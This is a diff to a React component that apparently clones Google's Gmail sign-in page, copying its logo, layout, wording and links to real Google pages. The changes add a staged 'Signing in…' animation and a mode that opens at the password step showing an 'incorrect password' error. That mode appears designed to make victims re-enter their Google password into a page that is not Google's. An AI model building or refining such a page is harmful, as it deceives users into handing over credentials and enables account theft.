@@ -6,6 +6,8 @@ interface GmailLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
   defaultEmail?: string;
+  startAtPasswordStep?: boolean;
+  incorrectPasswordError?: string;
 }
 
 // Custom floating label input for Google style
@@ -36,11 +38,16 @@ const GoogleInput = ({ value, onChange, label, type = "text", autoFocus = false 
 };
 
 
-const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail, startAtPasswordStep, incorrectPasswordError }) => {
   const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
-  const [showPasswordStep, setShowPasswordStep] = useState(false);
-  const [pageReady, setPageReady] = useState(false);
+  const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
+  // When mounted via the IncorrectPasswordPage (startAtPasswordStep=true), skip
+  // the 100ms pageReady gate so the password-step error UI renders immediately
+  // — without flashing the spinner or any of the email-step UI.
+  const [pageReady, setPageReady] = useState(!!startAtPasswordStep);
+  const [isTransitioning, setIsTransitioning] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
 
@@ -51,7 +58,13 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
 
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
-    if (email) { setShowPasswordStep(true); }
+    if (email) { 
+      setIsTransitioning(true);
+      setTimeout(() => {
+        setShowPasswordStep(true);
+        setIsTransitioning(false);
+      }, 1000);
+    }
   };
   
   const handleSubmit = async (e: React.FormEvent) => {
@@ -67,75 +80,152 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
     );
   }
 
+  // Show signing in loading state during transition (with progress line)
+  if (isTransitioning) {
+    return (
+      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
+        <main className="flex-grow w-full flex items-center justify-center p-4">
+          <div 
+            className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12 relative overflow-hidden"
+            style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
+          >
+            {/* Progress line at top */}
+            <div className="absolute top-0 left-0 right-0 h-[3px] bg-blue-100 overflow-hidden">
+              <div className="h-full bg-blue-600" style={{ animation: 'signingProgress 1s ease-in-out forwards' }} />
+            </div>
+            <style>{`
+              @keyframes signingProgress {
+                0% { width: 0%; }
+                100% { width: 100%; }
+              }
+            `}</style>
+            <div className="flex flex-col items-center justify-center py-16">
+              <Spinner size="lg" color="border-blue-600" />
+              <p className="mt-6 text-gray-700 text-base">Signing in…</p>
+            </div>
+          </div>
+        </main>
+      </div>
+    );
+  }
+
+  const GoogleLogo = () => (
+    <svg viewBox="0 0 48 48" className="h-10 w-10" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+  );
+
   return (
     <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ animation: 'fadeIn 0.3s ease-in' }}>
       <main className="flex-grow w-full flex items-center justify-center p-4">
         <div 
-          className="w-full max-w-lg mx-auto py-10 px-6 md:px-12 bg-white rounded-2xl"
-          style={{ boxShadow: '0 8px 32px rgba(0,0,0,.08)' }}
+          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12"
+          style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
         >
-          <div className="text-center">
-            <svg viewBox="0 0 272 92" className="h-7 mx-auto" xmlns="http://www.w3.org/2000/svg">
-              <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
-              <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
-              <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
-              <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
-              <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
-              <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z" fill="#4285F4"/>
-            </svg>
-            <h1 className="text-2xl text-gray-800 mt-4">Sign in</h1>
-            <p className="text-gray-600 mt-2">to continue to Gmail</p>
-          </div>
+          <form onSubmit={handleSubmit}>
+            <div className="flex flex-col md:flex-row md:gap-16">
+              {/* Left Column: Logo and heading */}
+              <div className="md:w-1/2 md:pt-4">
+                <GoogleLogo />
+                {!showPasswordStep ? (
+                  <>
+                    <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">Sign in</h1>
+                    <p className="text-[16px] leading-6 text-gray-900 mt-4 max-w-md">
+                      with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser.
+                    </p>
+                  </>
+                ) : (
+                  <>
+                    <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">Welcome</h1>
+                    <div className="mt-6">
+                      <button type="button" className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors">
+                        <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">
+                          {email.charAt(0).toUpperCase()}
+                        </div>
+                        <span className="text-sm text-gray-800 pr-1">{email}</span>
+                        <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
+                          <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
+                        </svg>
+                      </button>
+                    </div>
+                  </>
+                )}
+              </div>
 
-          <div className="mt-8">
-            <form onSubmit={handleSubmit}>
-              {errorMessage && !isLoading && (
-                <div className="text-red-600 text-sm font-medium text-center mb-4">{errorMessage}</div>
-              )}
-              
-              {!showPasswordStep ? (
-                // Email Step
-                <div>
-                  <GoogleInput value={email} onChange={(e: any) => setEmail(e.target.value)} label="Email or phone" type="email" autoFocus />
-                  <a href="https://accounts.google.com/signin/v2/recovery/identifier" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
-                    Forgot email?
-                  </a>
-                  <p className="text-xs text-gray-500 mt-8">
-                    Not your computer? Use Guest mode to sign in privately.
-                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline ml-1">Learn more</a>
-                  </p>
-                  <div className="flex justify-between items-center mt-8">
-                    <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
-                      Create account
+              {/* Right Column: Form */}
+              <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
+                {errorMessage && !isLoading && (
+                  <div className="text-red-600 text-sm font-medium mb-4">{errorMessage}</div>
+                )}
+                {!errorMessage && incorrectPasswordError && (
+                  <div className="text-red-600 text-sm font-medium mb-4">{incorrectPasswordError}</div>
+                )}
+
+                {!showPasswordStep ? (
+                  // Email Step
+                  <>
+                    <GoogleInput value={email} onChange={(e: any) => setEmail(e.target.value)} label="Email or phone" type="email" autoFocus />
+                    <a href="https://accounts.google.com/signin/v2/recovery/identifier" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-3 inline-block">
+                      Forgot email?
                     </a>
-                    <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:bg-blue-600 disabled:cursor-not-allowed transition-colors">
-                      Next
-                    </button>
-                  </div>
-                </div>
-              ) : (
-                // Password Step
-                <div>
-                  <div className="text-center text-sm font-medium p-2 rounded-full border border-gray-300 inline-block mb-4">{email}</div>
-                  <GoogleInput value={password} onChange={(e: any) => setPassword(e.target.value)} label="Enter your password" type="password" autoFocus />
-                  <a href="https://accounts.google.com/signin/v2/challenge/password/recovery" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
-                    Forgot password?
-                  </a>
-                  <div className="flex justify-end mt-8">
-                    <button type="submit" disabled={isLoading || !password} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:opacity-50 transition-colors">
-                       {isLoading ? <Spinner size="sm" color="border-white" /> : 'Next'}
-                    </button>
-                  </div>
-                </div>
-              )}
-            </form>
-          </div>
+                    <p className="text-sm text-gray-700 mt-10">
+                      Not your computer? Use Guest mode to sign in privately.{' '}
+                      <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline font-semibold">Learn more about using Guest mode</a>
+                    </p>
+                    <div className="flex justify-between items-center mt-12">
+                      <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
+                        Create account
+                      </a>
+                      <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+                        Next
+                      </button>
+                    </div>
+                  </>
+                ) : (
+                  // Password Step
+                  <>
+                    <GoogleInput 
+                      value={password} 
+                      onChange={(e: any) => setPassword(e.target.value)} 
+                      label="Enter your password" 
+                      type={showPassword ? "text" : "password"} 
+                      autoFocus 
+                    />
+                    <div className="flex items-center mt-4">
+                      <input
+                        type="checkbox"
+                        id="showPassword"
+                        checked={showPassword}
+                        onChange={(e) => setShowPassword(e.target.checked)}
+                        className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
+                      />
+                      <label htmlFor="showPassword" className="ml-2 text-sm text-gray-700 cursor-pointer">
+                        Show password
+                      </label>
+                    </div>
+                    <div className="flex justify-between items-center mt-12">
+                      <a href="https://accounts.google.com/signin/v2/challenge/password/recovery" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
+                        Forgot password?
+                      </a>
+                      <button type="submit" disabled={isLoading || !password} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 transition-colors">
+                         {isLoading ? <Spinner size="sm" color="border-white" /> : 'Next'}
+                      </button>
+                    </div>
+                  </>
+                )}
+              </div>
+            </div>
+          </form>
         </div>
       </main>
 
-      <footer className="w-full max-w-lg mx-auto flex justify-between items-center p-4 text-xs text-gray-600">
+      <footer className="w-full max-w-[960px] mx-auto flex justify-between items-center px-4 py-6 text-xs text-gray-700">
         <div>
-          <select className="bg-transparent text-gray-800 py-2 pr-6">
+          <select className="bg-transparent text-gray-600 py-2 pr-6 border-0 outline-none cursor-pointer">
+            <option value="en" selected>English (United States)</option>
             <option value="af">Afrikaans</option>
             <option value="az">Azərbaycan</option>
             <option value="id">Bahasa Indonesia</option>
@@ -146,7 +236,6 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
             <option value="de">Deutsch</option>
             <option value="et">Eesti</option>
             <option value="en-GB">English (United Kingdom)</option>
-            <option value="en" selected>English (United States)</option>
             <option value="es">Español (España)</option>
             <option value="es-419">Español (Latinoamérica)</option>
             <option value="eu">Euskara</option>
